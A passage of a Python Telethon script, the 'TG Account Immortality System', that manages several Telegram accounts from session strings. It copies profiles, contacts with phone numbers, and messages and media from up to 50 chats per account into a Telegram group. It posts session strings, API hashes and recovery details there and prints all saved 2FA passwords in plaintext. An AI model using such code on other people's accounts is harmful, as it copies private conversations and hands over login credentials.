        await send_to_topic(client, group_id, topic_id, header_msg)
        
        count = 0
        async for message in client.iter_messages('me', limit=limit):
            try:
                if message.text:
                    msg_text = f"💬 *Message #{count+1}*\n\n{message.text[:3000]}"
                    await send_to_topic(client, group_id, topic_id, msg_text)
                    count += 1
                    
                    if count % 10 == 0:
                        print(f"   Sent: {count}/{limit}")
                    
                    await asyncio.sleep(0.3)
                    
            except Exception as e:
                pass
        
        print(f"\n✅ Cloned {count} messages to topic!")
        
        await client.disconnect()
        
    except Exception as e:
        print(f"\n❌ Error: {e}")
    
    input("\nPress Enter...")

# ═══════════════════════════════════════════════════════════════
# 13. FULL BACKUP
# ═══════════════════════════════════════════════════════════════

# ═══════════════════════════════════════════════════════════════
# 13. FULL BACKUP (WITH ALL MESSAGES & MEDIA!)
# ═══════════════════════════════════════════════════════════════

async def full_backup():
    """Complete backup - EVERYTHING including all messages with media"""
    header("📦 FULL ACCOUNT BACKUP (EVERYTHING!)")
    
    accounts = load_accounts()
    config = load_config()
    group_id = config.get("group_id")
    
    if not accounts:
        print("\n⚠️ No accounts!")
        input("\nPress Enter...")
        return
    
    if not group_id:
        print("\n❌ Group not connected!")
        input("\nPress Enter...")
        return
    
    print("\n📋 Select account:\n")
    for i, name in enumerate(accounts.keys(), 1):
        print(f"   {i}. {name}")
    
    choice = input("\nEnter nickname: ").strip()
    
    if choice not in accounts:
        print(f"\n❌ '{choice}' not found!")
        input("\nPress Enter...")
        return
    
    nickname = choice
    info = accounts[nickname]
    session = info.get('session_string')
    
    if not session:
        print(f"\n⚠️ No session!")
        input("\nPress Enter...")
        return
    
    print("\n" + "=" * 60)
    print("📦 BACKUP OPTIONS")
    print("=" * 60)
    
    print("\n1. 📋 Basic Backup (Contacts, Groups only)")
    print("2. 🔥 FULL BACKUP (All chats + messages + media)")
    
    backup_type = input("\nChoice (1 or 2): ").strip()
    
    if backup_type == "2":
        print("\n⚠️ FULL BACKUP includes:")
        print("   • All contacts")
        print("   • All groups/channels")
        print("   • Messages from all chats (with media)")
        print("   • Photos, Videos, Documents, Audio, etc.")
        print("\n⏰ This may take 10-30 minutes depending on data!")
        
        msgs_per_chat = input("\nMessages per chat (default 50, max 500): ").strip()
        msgs_per_chat = int(msgs_per_chat) if msgs_per_chat.isdigit() else 50
        msgs_per_chat = min(msgs_per_chat, 500)
        
        confirm = input(f"\n📤 Backup last {msgs_per_chat} messages from ALL chats? (yes/no): ").strip().lower()
        if confirm != 'yes':
            print("\n❌ Cancelled")
            input("\nPress Enter...")
            return
    
    print(f"\n{'='*60}")
    print(f"📦 STARTING BACKUP: {nickname}")
    print(f"{'='*60}")
    
    try:
        client = TelegramClient(
            StringSession(session),
            info['api_id'],
            info['api_hash']
        )
        await client.connect()
        
        if not await client.is_user_authorized():
            print(f"❌ Session expired")
            await client.disconnect()
            input("\nPress Enter...")
            return
        
        me = await client.get_me()
        topic_id = info.get('topic_id')
        
        if not topic_id:
            topic_name = f"📱 {nickname}"
            topic_id = await get_or_create_topic(client, group_id, topic_name)
            accounts[nickname]['topic_id'] = topic_id
            save_accounts(accounts)
        
        # ═══════════════════════════════════════════════════════
        # 1. PROFILE
        # ═══════════════════════════════════════════════════════
        print("\n📤 [1/6] Backing up profile...")
        
        profile_msg = f"""📦 *FULL BACKUP STARTED - {nickname}*
━━━━━━━━━━━━━━━━━━━━━━━━━━

👤 *PROFILE*
━━━━━━━━━━━━━━━━━━━━━━━━━━

📛 Name: {me.first_name} {me.last_name or ''}
🆔 Username: @{me.username or 'None'}
📞 Phone: {me.phone or 'Hidden'}
💬 User ID: `{me.id}`

━━━━━━━━━━━━━━━━━━━━━━━━━━
📅 {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
━━━━━━━━━━━━━━━━━━━━━━━━━━"""
        
        await send_to_topic(client, group_id, topic_id, profile_msg)
        
        # Profile photo
        try:
            photos = await client.get_profile_photos('me', limit=1)
            if photos:
                await client.send_file(
                    entity=group_id,
                    file=photos[0],
                    caption="🖼️ *Profile Photo*",
                    reply_to=topic_id,
                    parse_mode='md'
                )
                print("   ✅ Profile photo")
        except:
            pass
        
        # ═══════════════════════════════════════════════════════
        # 2. CONTACTS
        # ═══════════════════════════════════════════════════════
        print("📤 [2/6] Backing up contacts...")
        
        result = await client(GetContactsRequest(hash=0))
        
        contacts_list = []
        for user in result.users:
            contact_info = f"• {user.first_name or ''} {user.last_name or ''}"
            if user.username:
                contact_info += f" (@{user.username})"
            if user.phone:
                contact_info += f" | +{user.phone}"
            contacts_list.append(contact_info)
        
        if contacts_list:
            chunk_size = 50
            chunks = [contacts_list[i:i+chunk_size] for i in range(0, len(contacts_list), chunk_size)]
            
            for i, chunk in enumerate(chunks, 1):
                msg = f"👥 *Contacts ({i}/{len(chunks)})*\n\n" + "\n".join(chunk)
                await send_to_topic(client, group_id, topic_id, msg)
                await asyncio.sleep(0.3)
            
            print(f"   ✅ {len(contacts_list)} contacts")
        
        # ═══════════════════════════════════════════════════════
        # 3. GROUPS & CHANNELS LIST
        # ═══════════════════════════════════════════════════════
        print("📤 [3/6] Backing up groups & channels list...")
        
        all_dialogs = []
        groups_list = []
        channels_list = []
        personal_chats = []
        
        async for dialog in client.iter_dialogs():
            all_dialogs.append(dialog)
            
            if dialog.is_group:
                g_info = f"• {dialog.title}"
                if hasattr(dialog.entity, 'username') and dialog.entity.username:
                    g_info += f" | t.me/{dialog.entity.username}"
                groups_list.append(g_info)
            elif dialog.is_channel:
                c_info = f"• {dialog.title}"
                if hasattr(dialog.entity, 'username') and dialog.entity.username:
                    c_info += f" | t.me/{dialog.entity.username}"
                channels_list.append(c_info)
            elif dialog.is_user and not dialog.entity.bot:
                personal_chats.append(dialog)
        
        # Send groups list
        if groups_list:
            chunk_size = 30
            chunks = [groups_list[i:i+chunk_size] for i in range(0, len(groups_list), chunk_size)]
            for i, chunk in enumerate(chunks, 1):
                msg = f"👥 *Groups ({i}/{len(chunks)}) - Total: {len(groups_list)}*\n\n" + "\n".join(chunk)
                await send_to_topic(client, group_id, topic_id, msg)
                await asyncio.sleep(0.3)
            print(f"   ✅ {len(groups_list)} groups")
        
        # Send channels list
        if channels_list:
            chunk_size = 30
            chunks = [channels_list[i:i+chunk_size] for i in range(0, len(channels_list), chunk_size)]
            for i, chunk in enumerate(chunks, 1):
                msg = f"📢 *Channels ({i}/{len(chunks)}) - Total: {len(channels_list)}*\n\n" + "\n".join(chunk)
                await send_to_topic(client, group_id, topic_id, msg)
                await asyncio.sleep(0.3)
            print(f"   ✅ {len(channels_list)} channels")
        
        # ═══════════════════════════════════════════════════════
        # 4. SAVED MESSAGES (Always backup)
        # ═══════════════════════════════════════════════════════
        print("📤 [4/6] Backing up Saved Messages...")
        
        saved_count = 0
        try:
            await send_to_topic(client, group_id, topic_id, "💾 *SAVED MESSAGES*\n━━━━━━━━━━━━━━━━━━━━━━━━━━")
            
            async for message in client.iter_messages('me', limit=100):
                try:
                    # Forward message (includes all media automatically!)
                    await client.send_message(
                        entity=group_id,
                        message=message.message,
                        file=message.media,
                        reply_to=topic_id
                    )
                    saved_count += 1
                    
                    if saved_count % 20 == 0:
                        print(f"   📥 {saved_count} saved messages...")
                    
                    await asyncio.sleep(0.2)
                except:
                    pass
            
            print(f"   ✅ {saved_count} saved messages")
        except Exception as e:
            print(f"   ⚠️ Saved messages: {e}")
        
        # ═══════════════════════════════════════════════════════
        # 5. ALL CHATS MESSAGES (FULL BACKUP ONLY)
        # ═══════════════════════════════════════════════════════
        if backup_type == "2":
            print(f"📤 [5/6] Backing up ALL CHATS (last {msgs_per_chat} msgs each)...")
            print("   ⚠️ This may take a while...\n")
            
            total_chats = len(all_dialogs)
            
            for idx, dialog in enumerate(all_dialogs[:50], 1):  # Limit to 50 chats to avoid spam
                try:
                    chat_name = dialog.name[:30]
                    print(f"   [{idx}/{min(50, total_chats)}] {chat_name}...", end=" ")
                    
                    # Send chat header
                    header_msg = f"""━━━━━━━━━━━━━━━━━━━━━━━━━━
💬 *CHAT: {dialog.name}*
━━━━━━━━━━━━━━━━━━━━━━━━━━"""
                    await send_to_topic(client, group_id, topic_id, header_msg)
                    
                    msg_count = 0
                    async for message in client.iter_messages(dialog, limit=msgs_per_chat):
                        try:
                            if message.media or message.text:
                                # Forward with media!
                                await client.send_message(
                                    entity=group_id,
                                    message=message.message or "",
                                    file=message.media,
                                    reply_to=topic_id
                                )
                                msg_count += 1
                                await asyncio.sleep(0.2)  # Rate limit
                        except:
                            pass
                    
                    print(f"✅ {msg_count} msgs")
                    
                except Exception as e:
                    print(f"⚠️ Error")
                    continue
        else:
            print("📤 [5/6] Skipped (Basic backup)")
        
        # ═══════════════════════════════════════════════════════
        # 6. MASTER VAULT UPDATE
        # ═══════════════════════════════════════════════════════
        print("📤 [6/6] Updating MASTER VAULT...")
        
        master_topic_id = config.get('topics', {}).get(MASTER_VAULT_NAME)
        if master_topic_id:
            recovery = info.get('recovery', {})
            master_msg = f"""🔐 *{nickname} - FULL BACKUP*
━━━━━━━━━━━━━━━━━━━━━━━━━━

📱 `{info.get('phone', 'N/A')}`
🔑 `{info.get('api_id', 'N/A')}`
🔐 `{info.get('api_hash', 'N/A')}`
📧 {recovery.get('email', '❌')}
🔒 2FA: {'✅' if recovery.get('twofa_password') else '❌'}

━━━━━━━━━━━━━━━━━━━━━━━━━━
📄 *SESSION:*
`{session}`

━━━━━━━━━━━━━━━━━━━━━━━━━━
📊 *Backup Summary:*
👥 Contacts: {len(contacts_list)}
🏛️ Groups: {len(groups_list)}
📢 Channels: {len(channels_list)}
💾 Saved: {saved_count} msgs
{'📦 All Chats: Backed up' if backup_type == '2' else ''}

━━━━━━━━━━━━━━━━━━━━━━━━━━
📅 {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
━━━━━━━━━━━━━━━━━━━━━━━━━━"""
            
            await send_to_topic(client, group_id, master_topic_id, master_msg)
            print("   ✅ MASTER VAULT updated")
        
        # ═══════════════════════════════════════════════════════
        # COMPLETION
        # ═══════════════════════════════════════════════════════
        
        recovery = info.get('recovery', {})
        final_msg = f"""✅ *FULL BACKUP COMPLETE!*
━━━━━━━━━━━━━━━━━━━━━━━━━━

📊 *Summary:*
• 👤 Profile: ✅
• 🖼️ Profile Photo: ✅
• 👥 Contacts: {len(contacts_list)}
• 🏛️ Groups: {len(groups_list)}
• 📢 Channels: {len(channels_list)}
• 💾 Saved Messages: {saved_count}
{'• 📦 All Chats: ✅ Backed up with media' if backup_type == '2' else '• 📦 Chats: Basic only'}
• 🔐 Session: ✅
• 📧 Email: {'✅' if recovery.get('email') else '❌'}
• 🔒 2FA: {'✅' if recovery.get('twofa_password') else '❌'}

━━━━━━━━━━━━━━━━━━━━━━━━━━
📅 {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
━━━━━━━━━━━━━━━━━━━━━━━━━━

🛡️ *Account is IMMORTAL!*
📱 Videos, Photos, Audio - ALL BACKED UP!
💾 Everything is in this topic!"""
        
        await send_to_topic(client, group_id, topic_id, final_msg)
        
        await client.disconnect()
        
        print(f"\n{'='*60}")
        print(f"✅ {nickname} - BACKUP COMPLETE!")
        print(f"{'='*60}")
        print(f"\n📊 Everything backed up to topic!")
        print(f"📁 Check your group → {nickname} topic")
        
    except Exception as e:
        print(f"\n❌ Error: {e}")
        import traceback
        traceback.print_exc()
    
    input("\n\nPress Enter to continue...")


# ═══════════════════════════════════════════════════════════════
# 15. SELECTIVE CHAT BACKUP
# ═══════════════════════════════════════════════════════════════

async def selective_backup():
    """Backup specific chats only - choose what you want!"""
    header("📋 SELECTIVE CHAT BACKUP")
    
    accounts = load_accounts()
    config = load_config()
    group_id = config.get("group_id")
    
    if not accounts:
        print("\n⚠️ No accounts!")
        input("\nPress Enter...")
        return
    
    if not group_id:
        print("\n❌ Group not connected!")
        input("\nPress Enter...")
        return
    
    print("\n📋 Select account:\n")
    for i, name in enumerate(accounts.keys(), 1):
        print(f"   {i}. {name}")
    
    choice = input("\nEnter nickname: ").strip()
    
    if choice not in accounts:
        print(f"\n❌ '{choice}' not found!")
        input("\nPress Enter...")
        return
    
    nickname = choice
    info = accounts[nickname]
    session = info.get('session_string')
    
    if not session:
        print(f"\n⚠️ No session!")
        input("\nPress Enter...")
        return
    
    print("\n⏳ Loading chats...")
    
    try:
        client = TelegramClient(
            StringSession(session),
            info['api_id'],
            info['api_hash']
        )
        await client.connect()
        
        if not await client.is_user_authorized():
            print("❌ Session expired")
            await client.disconnect()
            input("\nPress Enter...")
            return
        
        topic_id = info.get('topic_id')
        
        if not topic_id:
            topic_name = f"📱 {nickname}"
            topic_id = await get_or_create_topic(client, group_id, topic_name)
            accounts[nickname]['topic_id'] = topic_id
            save_accounts(accounts)
        
        # ═══════════════════════════════════════════════════════
        # CATEGORIZE CHATS
        # ═══════════════════════════════════════════════════════
        
        print("📂 Categorizing chats...")
        
        groups_dict = {}
        channels_dict = {}
        personal_dict = {}
        bots_dict = {}
        
        async for dialog in client.iter_dialogs():
            if dialog.is_group:
                groups_dict[dialog.id] = {
                    'dialog': dialog,
                    'name': dialog.name,
                    'username': dialog.entity.username if hasattr(dialog.entity, 'username') else None
                }
            elif dialog.is_channel:
                channels_dict[dialog.id] = {
                    'dialog': dialog,
                    'name': dialog.name,
                    'username': dialog.entity.username if hasattr(dialog.entity, 'username') else None
                }
            elif dialog.is_user:
                if dialog.entity.bot:
                    bots_dict[dialog.id] = {
                        'dialog': dialog,
                        'name': dialog.name,
                        'username': dialog.entity.username if hasattr(dialog.entity, 'username') else None
                    }
                else:
                    personal_dict[dialog.id] = {
                        'dialog': dialog,
                        'name': dialog.name,
                        'username': dialog.entity.username if hasattr(dialog.entity, 'username') else None
                    }
        
        # ═══════════════════════════════════════════════════════
        # STEP 1: CHOOSE CATEGORY
        # ═══════════════════════════════════════════════════════
        
        while True:
            header("📋 SELECT CHAT TYPE")
            
            print(f"\n📊 Your Chats:\n")
            print(f"   1. 👥 Groups ({len(groups_dict)})")
            print(f"   2. 📢 Channels ({len(channels_dict)})")
            print(f"   3. 💬 Personal DMs ({len(personal_dict)})")
            print(f"   4. 🤖 Bots ({len(bots_dict)})")
            print(f"   5. 💾 Saved Messages")
            print(f"   6. ⬅️  Back")
            
            category = input("\nSelect type: ").strip()
            
            if category == "6":
                await client.disconnect()
                return
            
            # ═══════════════════════════════════════════════════════
            # STEP 2: CHOOSE SPECIFIC CHATS
            # ═══════════════════════════════════════════════════════
            
            selected_chats = []
            
            if category == "1":
                selected_chats = await select_chats_from_category(groups_dict, "GROUPS")
            elif category == "2":
                selected_chats = await select_chats_from_category(channels_dict, "CHANNELS")
            elif category == "3":
                selected_chats = await select_chats_from_category(personal_dict, "PERSONAL DMs")
            elif category == "4":
                selected_chats = await select_chats_from_category(bots_dict, "BOTS")
            elif category == "5":
                # Saved messages
                selected_chats = [{'dialog': 'me', 'name': 'Saved Messages'}]
            else:
                print("\n❌ Invalid choice!")
                await asyncio.sleep(1)
                continue
            
            if not selected_chats:
                continue
            
            # ═══════════════════════════════════════════════════════
            # STEP 3: HOW MANY MESSAGES
            # ═══════════════════════════════════════════════════════
            
            print(f"\n📊 Selected {len(selected_chats)} chat(s)")
            
            msgs_limit = input("\nMessages per chat (default 50, max 1000): ").strip()
            msgs_limit = int(msgs_limit) if msgs_limit.isdigit() else 50
            msgs_limit = min(msgs_limit, 1000)
            
            print(f"\n⚠️ Will backup:")
            for chat in selected_chats:
                print(f"   • {chat['name'][:40]} — Last {msgs_limit} msgs")
            
            confirm = input("\n📤 Start backup? (yes/no): ").strip().lower()
            
            if confirm != 'yes':
                continue
            
            # ═══════════════════════════════════════════════════════
            # STEP 4: BACKUP SELECTED CHATS
            # ═══════════════════════════════════════════════════════
            
            print(f"\n{'='*60}")
            print(f"📦 BACKING UP SELECTED CHATS")
            print(f"{'='*60}\n")
            
            total_msgs = 0
            
            for idx, chat_info in enumerate(selected_chats, 1):
                try:
                    chat_name = chat_info['name'][:40]
                    dialog = chat_info['dialog']
                    
                    print(f"[{idx}/{len(selected_chats)}] 📤 {chat_name}...", end=" ", flush=True)
                    
                    # Send chat header
                    header_msg = f"""━━━━━━━━━━━━━━━━━━━━━━━━━━
💬 *CHAT: {chat_info['name']}*
━━━━━━━━━━━━━━━━━━━━━━━━━━
📊 Backing up last {msgs_limit} messages
📅 {datetime.now().strftime('%Y-%m-%d %H:%M')}
━━━━━━━━━━━━━━━━━━━━━━━━━━"""
                    
                    await send_to_topic(client, group_id, topic_id, header_msg)
                    
                    # Backup messages
                    msg_count = 0
                    async for message in client.iter_messages(dialog, limit=msgs_limit):
                        try:
                            # Forward message with media!
                            if message.media or message.text:
                                await client.send_message(
                                    entity=group_id,
                                    message=message.message or "",
                                    file=message.media,
                                    reply_to=topic_id
                                )
                                msg_count += 1
                                total_msgs += 1
                                await asyncio.sleep(0.15)  # Rate limit
                        except Exception as e:
                            pass
                    
                    print(f"✅ {msg_count} msgs")
                    
                except Exception as e:
                    print(f"❌ Error: {e}")
                    continue
            
            # ═══════════════════════════════════════════════════════
            # COMPLETION
            # ═══════════════════════════════════════════════════════
            
            completion_msg = f"""✅ *SELECTIVE BACKUP COMPLETE!*
━━━━━━━━━━━━━━━━━━━━━━━━━━

📊 *Summary:*
• 💬 Chats backed up: {len(selected_chats)}
• 📨 Total messages: {total_msgs}
• 📷 Media: Included (photos, videos, docs, etc.)

━━━━━━━━━━━━━━━━━━━━━━━━━━
📅 {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
━━━━━━━━━━━━━━━━━━━━━━━━━━"""
            
            await send_to_topic(client, group_id, topic_id, completion_msg)
            
            print(f"\n{'='*60}")
            print(f"✅ BACKUP COMPLETE!")
            print(f"{'='*60}")
            print(f"\n📊 {total_msgs} messages backed up from {len(selected_chats)} chats")
            print(f"📁 Check topic: {nickname}")
            
            another = input("\n📋 Backup more chats? (yes/no): ").strip().lower()
            if another != 'yes':
                break
        
        await client.disconnect()
        
    except Exception as e:
        print(f"\n❌ Error: {e}")
        import traceback
        traceback.print_exc()
    
    input("\n\nPress Enter to continue...")

# ═══════════════════════════════════════════════════════════════
# HELPER: SELECT CHATS FROM CATEGORY
# ═══════════════════════════════════════════════════════════════

async def select_chats_from_category(chats_dict, category_name):
    """Helper to select specific chats from a category"""
    
    if not chats_dict:
        print(f"\n⚠️ No {category_name} found!")
        await asyncio.sleep(1)
        return []
    
    header(f"SELECT {category_name}")
    
    # Convert to list for indexing
    chats_list = list(chats_dict.values())
    
    # Show paginated list
    page_size = 20
    total_pages = (len(chats_list) + page_size - 1) // page_size
    current_page = 0
    
    while True:
        clear()
        print("=" * 60)
        print(f"  SELECT {category_name} - Page {current_page + 1}/{total_pages}")
        print("=" * 60)
        
        start_idx = current_page * page_size
        end_idx = min(start_idx + page_size, len(chats_list))
        
        print(f"\n📋 Showing {start_idx + 1}-{end_idx} of {len(chats_list)}:\n")
        
        for i in range(start_idx, end_idx):
            chat = chats_list[i]
            username_str = f"(@{chat['username']})" if chat.get('username') else ""
            print(f"   {i+1}. {chat['name'][:35]} {username_str}")
        
        print("\n" + "-" * 60)
        print("\n📌 Options:")
        print("   • Enter numbers: 1,3,5 or 1-10")
        print("   • Type 'all' for all chats")
        print("   • Type 'n' for next page")
        print("   • Type 'p' for previous page")
        print("   • Type 'search' to search")
        print("   • Type 'cancel' to go back")
        
        choice = input("\nYour selection: ").strip().lower()
        
        if choice == 'cancel':
            return []
        
        if choice == 'n':
            if current_page < total_pages - 1:
                current_page += 1
            continue
        
        if choice == 'p':
            if current_page > 0:
                current_page -= 1
            continue
        
        if choice == 'search':
            search_term = input("\n🔍 Search: ").strip().lower()
            filtered = []
            for chat in chats_list:
                if search_term in chat['name'].lower():
                    filtered.append(chat)
            
            if filtered:
                print(f"\n📋 Found {len(filtered)} matches:\n")
                for i, chat in enumerate(filtered[:20], 1):
                    print(f"   {i}. {chat['name'][:40]}")
                
                nums = input("\nSelect (e.g., 1,3,5): ").strip()
                try:
                    indices = parse_selection(nums, len(filtered))
                    selected = [filtered[i-1] for i in indices if 0 < i <= len(filtered)]
                    if selected:
                        return selected
                except:
                    print("\n❌ Invalid selection!")
                    await asyncio.sleep(1)
            else:
                print("\n⚠️ No matches!")
                await asyncio.sleep(1)
            continue
        
        if choice == 'all':
            confirm = input(f"\n⚠️ Backup ALL {len(chats_list)} chats? (yes/no): ").strip().lower()
            if confirm == 'yes':
                return chats_list
            continue
        
        # Parse number selection
        try:
            indices = parse_selection(choice, len(chats_list))
            selected = [chats_list[i-1] for i in indices if 0 < i <= len(chats_list)]
            
            if selected:
                print(f"\n✅ Selected {len(selected)} chat(s):")
                for chat in selected[:5]:
                    print(f"   • {chat['name'][:40]}")
                if len(selected) > 5:
                    print(f"   ... and {len(selected) - 5} more")
                
                confirm = input("\n📤 Backup these? (yes/no): ").strip().lower()
                if confirm == 'yes':
                    return selected
            else:
                print("\n❌ No valid chats selected!")
                await asyncio.sleep(1)
                
        except Exception as e:
            print(f"\n❌ Invalid selection! {e}")
            await asyncio.sleep(1)

def parse_selection(selection_str, max_num):
    """Parse selection string like '1,3,5' or '1-10' into list of numbers"""
    indices = set()
    
    parts = selection_str.split(',')
    for part in parts:
        part = part.strip()
        
        if '-' in part:
            # Range: 1-10
            try:
                start, end = part.split('-')
                start = int(start.strip())
                end = int(end.strip())
                indices.update(range(start, end + 1))
            except:
                pass
        else:
            # Single number
            try:
                indices.add(int(part))
            except:
                pass
    
    return sorted([i for i in indices if 1 <= i <= max_num])

# ═══════════════════════════════════════════════════════════════
# 14. QUICK SYNC
# ═══════════════════════════════════════════════════════════════

async def quick_sync():
    """Quick daily sync - health check + session backup"""
    header("⚡ QUICK SYNC")
    
    accounts = load_accounts()
    config = load_config()
    group_id = config.get("group_id")
    
    if not accounts:
        print("\n⚠️ No accounts!")
        input("\nPress Enter...")
        return
    
    print(f"\n⚡ Quick syncing {len(accounts)} accounts...\n")
    print("-" * 60)
    
    for nickname, info in accounts.items():
        session = info.get('session_string')
        
        if not session:
            print(f"⚠️ {nickname}: No session")
            continue
        
        try:
            client = TelegramClient(
                StringSession(session),
                info['api_id'],
                info['api_hash']
            )
            await client.connect()
            
            if await client.is_user_authorized():
                me = await client.get_me()
                print(f"✅ {nickname}: Active ({me.first_name})")
                
                topic_id = info.get('topic_id')
                if group_id and topic_id:
                    sync_msg = f"""⚡ *QUICK SYNC*
━━━━━━━━━━━━━━━━━━━
🟢 Status: Active
👤 {me.first_name}
📅 {datetime.now().strftime('%Y-%m-%d %H:%M')}
━━━━━━━━━━━━━━━━━━━"""
                    await send_to_topic(client, group_id, topic_id, sync_msg)
            else:
                print(f"❌ {nickname}: Expired")
            
            await client.disconnect()
            
        except Exception as e:
            print(f"⚠️ {nickname}: {e}")
    
    print("\n" + "-" * 60)
    print("⚡ Quick sync complete!")
    input("\nPress Enter...")

# ═══════════════════════════════════════════════════════════════
# 9. RECOVERY CENTER
# ═══════════════════════════════════════════════════════════════

async def recovery_center():
    """Emergency recovery center"""
    while True:
        header("🚨 EMERGENCY RECOVERY CENTER")
        
        print("""
╔════════════════════════════════════════════════════════════╗
║                 🚨 RECOVERY OPTIONS 🚨                     ║
╠════════════════════════════════════════════════════════════╣
║                                                            ║
║   1. 📋 View All Recovery Info                             ║
║   2. 📱 SIM Reissue Guide                                  ║
║   3. 📧 Email Recovery Guide                               ║
║   4. 🔐 View All 2FA Passwords                             ║
║   5. 📞 Telecom Helplines                                  ║
║   6. ⬅️  Back                                               ║
║                                                            ║
╚════════════════════════════════════════════════════════════╝
""")
        
        choice = input("Choice: ").strip()
        
        if choice == "1":
            await view_recovery_info()
        elif choice == "2":
            show_sim_guide()
        elif choice == "3":
            show_email_guide()
        elif choice == "4":
            await view_2fa()
        elif choice == "5":
            show_helplines()
        elif choice == "6":
            break

async def view_recovery_info():
    header("📋 ALL RECOVERY INFO")
    accounts = load_accounts()
    
    for name, info in accounts.items():
        recovery = info.get('recovery', {})
        print(f"\n{'='*50}")
        print(f"👤 {name}")
        print(f"📞 {info.get('phone', 'N/A')}")
        print(f"📧 Email: {recovery.get('email') or '❌ Not linked'}")
        print(f"🔐 2FA: {'✅ Saved' if recovery.get('twofa_password') else '❌ Not saved'}")
        print(f"📱 Telecom: {recovery.get('telecom', 'Unknown')}")
    
    input("\n\nPress Enter...")

async def view_2fa():
    header("🔐 ALL 2FA PASSWORDS")
    accounts = load_accounts()
    
    print("\n⚠️ SENSITIVE INFORMATION!\n")
    
    for name, info in accounts.items():
        recovery = info.get('recovery', {})
        twofa = recovery.get('twofa_password', '')
        print(f"👤 {name}")
        print(f"   🔐 {twofa if twofa else '❌ Not saved'}\n")
    
    input("\nPress Enter...")

def show_sim_guide():
    header("📱 SIM REISSUE GUIDE")
    print("""
╔════════════════════════════════════════════════════════════╗
║           📱 SIM REISSUE - YOUR SOLUTION! 📱               ║
╠════════════════════════════════════════════════════════════╣
║                                                            ║
║   You can reissue SIM from ANY city in India!             ║
║                                                            ║
║   WHAT YOU NEED:                                           ║
║   ✅ Aadhaar Card (Original)                               ║
║   ✅ ₹20-50                                                ║
║   ✅ 10-15 minutes                                         ║
║                                                            ║
║   WHERE TO GO:                                             ║
║   • Jio → Any Jio Store / Reliance Digital                ║
║   • Airtel → Any Airtel Store                             ║
║   • Vi → Any Vi Store                                     ║
║                                                            ║
║   STEPS:                                                   ║
║   1. Go with Aadhaar                                      ║
║   2. Say "SIM replacement for [number]"                   ║
║   3. Fill form + biometric                                ║
║   4. Get new SIM                                          ║
║   5. Wait 2-4 hours activation                            ║
║   6. Receive OTP! 🎉                                      ║
║                                                            ║
╚════════════════════════════════════════════════════════════╝
""")
    input("\nPress Enter...")

def show_email_guide():
    header("📧 EMAIL RECOVERY GUIDE")
    print("""
╔════════════════════════════════════════════════════════════╗
║              📧 EMAIL - BEST PREVENTION! 📧               ║
╠════════════════════════════════════════════════════════════╣
║                                                            ║
║   HOW TO LINK EMAIL:                                       ║
║                                                            ║
║   1. Open Telegram                                         ║
║   2. Settings → Privacy and Security                      ║
║   3. Scroll to "Email" or "Login Email"                   ║
║   4. Add your email                                        ║
║   5. Verify via email code                                 ║
║   6. DONE! ✅                                              ║
║                                                            ║
║   BENEFITS:                                                ║
║   ✅ OTP sent to email (not just SMS!)                    ║
║   ✅ No SIM needed for login                              ║
║   ✅ Works from anywhere                                  ║
║                                                            ║
╚════════════════════════════════════════════════════════════╝
""")
    input("\nPress Enter...")

def show_helplines():
    header("📞 TELECOM HELPLINES")
    print("""
╔════════════════════════════════════════════════════════════╗
║                 📞 HELPLINE NUMBERS 📞                     ║
╠════════════════════════════════════════════════════════════╣
║                                                            ║
║  JIO:      198 (from Jio) / 1800-889-9999                 ║
║  AIRTEL:   121 (from Airtel) / 1800-103-4444              ║
║  VI:       199 (from Vi) / 1800-120-1212                  ║
║  BSNL:     1800-180-1503                                  ║
║                                                            ║
╚════════════════════════════════════════════════════════════╝
""")
    input("\nPress Enter...")

# ═══════════════════════════════════════════════════════════════
# MAIN MENU
# ═══════════════════════════════════════════════════════════════

async def main():
    while True:
        header("TG ACCOUNT IMMORTALITY SYSTEM")
        
        accounts = load_accounts()
        config = load_config()
        
        print(f"\n📊 Accounts: {len(accounts)}")
        print(f"☁️ Group: {'✅ Connected' if config.get('group_id') else '❌ Not connected'}")
        print(f"📁 Topics: {len(config.get('topics', {}))}\n")
        
        print("-" * 60)
        
        print("\n📌 ACCOUNTS:\n")
        print("   1. ➕ Add Account")
        print("   2. 📋 List Accounts")
        print("   3. 🗑️ Remove Account")
        print("   4. 🔍 Check Health")
        
        print("\n📌 OTP:\n")
        print("   5. 👂 OTP Listener")
        
        print("\n📌 SESSION:\n")
        print("   6. 📄 View Session String")
        print("   7. 📥 Import from String (NO OTP!)")
        print("   8. 🔄 Resync All to Group")
        
        print("\n📌 CLONE & BACKUP:\n")
        print("   10. 👥 Clone Contacts")
        print("   11. 🏛️ Clone Groups/Channels")
        print("   12. 💬 Clone Saved Messages")
        print("   13. 📦 FULL BACKUP (Everything!)")
        print("   14. ⚡ Quick Sync (Daily)")
        
        print("\n📌 RECOVERY:\n")
        print("   9. 🚨 Emergency Recovery Center")
        
        print("\n   0. 🚪 Exit")
        
        print("\n" + "-" * 60)
        
        choice = input("\nChoice: ").strip()
        
        if choice == "1":
            await add_account()
        elif choice == "2":
            await list_accounts()
        elif choice == "3":
            await remove_account()
        elif choice == "4":
            await check_health()
        elif choice == "5":
            await otp_listener()
        elif choice == "6":
            await view_session()
        elif choice == "7":
            await import_from_string()
        elif choice == "8":
            await resync_all()
        elif choice == "9":
            await recovery_center()
        elif choice == "10":
            await clone_contacts()
        elif choice == "11":
            await clone_groups()
        elif choice == "12":
            await clone_messages()
        elif choice == "13":
            await full_backup()
        elif choice == "14":
            await quick_sync()
        elif choice == "0":
            print("\n👋 Bye!\n")
            break

# ═══════════════════════════════════════════════════════════════
# RUN
# ═══════════════════════════════════════════════════════════════

if __name__ == "__main__":
    print("""
    ╔════════════════════════════════════════════════════════╗
    ║     🤖 TG ACCOUNT IMMORTALITY SYSTEM v3.0 🤖          ║
    ║                                                        ║
    ║     • Auto Topics Organization                         ║
    ║     • MASTER VAULT for Credentials                     ║
    ║     • OTP Auto-Forward to Topics                       ║
    ║     • Full Clone: Contacts, Groups, Messages           ║
    ║     • Complete Recovery System                         ║
    ╚════════════════════════════════════════════════════════╝
    """)
    
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\n\n👋 Bye!\n")
